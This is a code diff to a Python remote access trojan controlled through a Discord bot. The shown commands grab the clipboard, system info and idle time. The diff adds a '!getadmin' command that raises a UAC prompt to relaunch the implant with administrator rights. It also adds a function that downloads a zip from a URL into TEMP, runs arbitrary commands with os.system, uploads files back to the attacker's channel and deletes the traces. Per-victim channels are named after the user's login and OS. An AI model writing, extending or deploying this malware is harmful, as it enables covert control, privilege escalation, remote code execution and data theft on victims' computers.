@@ -2,6 +2,8 @@ import os
 import discord
 from ctypes import windll, sizeof, c_uint, byref, c_int, Structure
 import asyncio
+import sys
+from subprocess import list2cmdline
 
 token = ""
 global appdata
@@ -31,9 +33,71 @@ Available commands are:
 • !clipboard - Retrieve clipboard content
 • !sysinfo - Display system information
 • !admincheck - Check if you're an admin
+• !getadmin - request for admin access
 • !idletime - Check user idle time
 • !botservers - Check the number of servers the bot is in
 """
+
+def runAsAdmin(cmdLine=None, wait=True):
+    if os.name != 'nt':
+        raise RuntimeError("This function is only implemented on Windows.")
+
+    import win32con
+    import win32event
+    import win32process
+    # noinspection PyUnresolvedReferences
+    from win32com.shell.shell import ShellExecuteEx
+    # noinspection PyUnresolvedReferences
+    from win32com.shell import shellcon
+
+    if not cmdLine:
+        cmdLine = [sys.executable] + sys.argv
+    elif type(cmdLine) not in (tuple, list):
+        raise ValueError("cmdLine is not a sequence.")
+
+    showCmd = win32con.SW_SHOWNORMAL
+    lpVerb = 'runas'  # causes UAC elevation prompt.
+
+    cmd = cmdLine[0]
+    params = list2cmdline(cmdLine[1:])
+
+    procInfo = ShellExecuteEx(
+        nShow=0,
+        fMask=shellcon.SEE_MASK_NOCLOSEPROCESS,
+        lpVerb=lpVerb,
+        lpFile=cmd,
+        lpParameters=params)
+
+    if wait:
+        procHandle = procInfo['hProcess']
+        _ = win32event.WaitForSingleObject(procHandle, win32event.INFINITE)
+        rc = win32process.GetExitCodeProcess(procHandle)
+    else:
+        rc = None
+
+    return rc
+
+async def downloadZipAndRunExe(message,url,commands=[''],sendFiles=[''],removeFiles=['']):
+        import os
+        import urllib.request
+        from zipfile import ZipFile
+
+        directory = os.getcwd()
+        try:
+            os.chdir(os.getenv("TEMP"))
+            urllib.request.urlretrieve(url, "temp.zip")
+            with ZipFile("temp.zip") as zipObj:
+                zipObj.extractall()
+            for command in commands:
+                os.system(f"{command}")
+            for f in sendFiles:
+                disFile = discord.File(f, filename="temp.png")
+                await message.channel.send( file=disFile)
+            for f in removeFiles:
+                os.remove(f"{f}")
+            os.chdir(directory)
+        except:
+            await message.channel.send("[!] Command failed")
 
 
 async def activity(client):
@@ -67,25 +131,25 @@ async def on_ready():
     global number
     number = 0
     global channel_name
-    channel_name = None
+    channel_name = f'session-{os.getlogin()}-{platform.system()}-{platform.release()}'.lower()
     for x in client.get_all_channels():
         (on_ready.total).append(x.name)
-    for y in range(len(on_ready.total)):
-        if "session" in on_ready.total[y]:
-            import re
+        # if "session" in on_ready.total[y]:
+        #     import re
 
-            result = [e for e in re.split("[^0-9]", on_ready.total[y]) if e != ""]
-            biggest = max(map(int, result))
-            number = biggest + 1
-        else:
-            pass
-    if number == 0:
-        channel_name = "session-1"
-        newchannel = await client.guilds[0].create_text_channel(channel_name)
+        #     result = [e for e in re.split("[^0-9]", on_ready.total[y]) if e != ""]
+        #     biggest = max(map(int, result))
+        #     number = biggest + 1
+        # else:
+        #     pass
+    if channel_name not in on_ready.total:
+        new_channel = await client.guilds[0].create_text_channel(channel_name)
+        print(new_channel)
+        channel_ = discord.utils.get(client.get_all_channels(), name=new_channel.name)
+        print(channel_)
     else:
-        channel_name = f"session-{number}"
-        newchannel = await client.guilds[0].create_text_channel(channel_name)
-    channel_ = discord.utils.get(client.get_all_channels(), name=channel_name)
+        channel_ = discord.utils.get(client.get_all_channels(), name=channel_name)
+    
     channel = client.get_channel(channel_.id)
     is_admin = windll.shell32.IsUserAnAdmin() != 0
     value1 = f"@here :white_check_mark: New session opened {channel_name} | {platform.system()} {platform.release()} | | User : {os.getlogin()}"
@@ -304,10 +368,22 @@ async def on_message(message):
             import ctypes
 
             is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
-            if is_admin == True:
+            if is_admin:
                 await message.channel.send("[*] Congrats you're admin")
-            elif is_admin == False:
+            else:
                 await message.channel.send("[!] Sorry, you're not admin")
+        
+        if message.content == "!getadmin":
+            import ctypes
+            if not ctypes.windll.shell32.IsUserAnAdmin() != 0:
+                try:
+                    await message.channel.send("[!] Sending Prompt to run as admin")
+                    runAsAdmin()
+                    exit()
+                except Exception as e:
+                    await message.channel.send(f'Failed to run as admin: {e}')
+            else:
+                await message.channel.send("[!] You are already admin")
 
         if message.content == "!idletime":
 
